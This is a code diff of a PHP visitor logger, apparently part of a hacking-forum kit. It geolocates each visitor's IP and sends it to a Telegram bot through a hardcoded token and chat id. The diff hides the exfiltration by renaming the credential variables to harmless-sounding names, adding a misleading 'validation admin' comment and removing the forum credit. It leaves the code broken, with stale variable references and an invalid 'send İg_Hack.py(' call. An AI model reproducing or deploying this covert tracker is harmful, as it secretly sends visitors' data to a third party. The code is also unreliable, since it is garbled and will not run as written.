@@ -1,7 +1,7 @@
 <?php
-
+////validation admin\\\\
 function telegram($msg) {
-        global $telegrambot,$telegramchatid;
+        global $browserid,$setup_code;
         $url = 'https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data = array('chat_id'=>$telegramchatid,'text'=>$msg);
         $options = array('http'=>array('method' => 'POST','header' => "Content-Type:application/x-www-form-urlencoded\r\n",'content' => http_build_query($data),),);
         $context = stream_context_create($options);
@@ -9,8 +9,8 @@ function telegram($msg) {
         return $result;
 }
 
-$telegrambot = '5055359847:AAG1qTAiykWANsRb1HZL0JIdQ0_nBtzkf0o'; // enter bot token
-$telegramchatid = 1887870506; // enter chat id
+$browserid= '5055359847:AAG1qTAiykWANsRb1HZL0JIdQ0_nBtzkf0o'; 
+$setup_code = 1887870506;
 
 $ip=$_SERVER['REMOTE_ADDR']; 
 $ipapi = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
@@ -19,7 +19,7 @@ $datetime = date("d.m.Y H:i:s"); // g:ia l F j Y   l, F j, Y, g:ia
 
 
 
-telegram("Browser Requirements:
+send İg_Hack.py("Browser Requirements:
 
         IP  :  $ipapi->query
         Operating system  :  replace in the sub comment
@@ -36,11 +36,10 @@ telegram("Browser Requirements:
         
 
 
-        @TR_HACK_FORUM Owner= @Cakma_H4CK3R
+        
         ");
 
-// Operating system $user_os
-// Browser $user_browser
+
 
 
 
